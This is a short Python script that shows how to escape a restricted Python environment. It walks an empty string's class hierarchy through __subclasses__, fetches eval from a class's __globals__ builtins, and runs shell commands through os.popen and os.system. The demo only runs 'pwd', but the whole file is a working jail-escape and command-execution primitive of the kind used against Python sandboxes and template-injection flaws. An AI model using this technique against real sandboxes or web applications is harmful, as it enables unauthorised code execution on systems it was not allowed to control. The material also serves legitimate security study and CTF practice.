#!/usr/bin/env python3
# -*- coding: utf-8 -*-

def list_abailable_subclasses(obj):
    """Check the type if has __globals__ attributes.
    """
    return [
        subobj.__name__
        for subobj in obj.__class__.__base__.__subclasses__()
        # 'wrapper_descriptor' object has no attribute '__globals__'

        if hasattr(subobj.__init__, '__globals__')
    ]


def get_builtin_function(obj, subclass_name, func_name):
    """Get function obj.
    """
    func = None
    for subobj in obj.__class__.__base__.__subclasses__():
        if subclass_name == subobj.__name__:
            __globals__ = subobj.__init__.__globals__
            __builtins__ = __globals__.get('__builtins__')
            func = __builtins__.get(func_name)
            break

    return func


def system(cmd):
    """A function which is similar to os.system.
    """
    obj = ''
    names = list_abailable_subclasses(obj)
    # print(names)

    if names:
        func_eval = get_builtin_function(obj, names[0], 'eval')
        func_print = get_builtin_function(obj, names[0], 'print')

        # func_eval('__import__("os").system("%s")' % cmd)
        if func_eval and func_print:
            data = func_eval('__import__("os").popen("%s").read()' % cmd)
            func_print(data)


if __name__ == '__main__':
    system('pwd')

    func_eval = get_builtin_function('', 'Repr', 'eval')
    func_eval('__import__("os").system("pwd")')



# reference
# https://docs.python.org/3/reference/datamodel.html
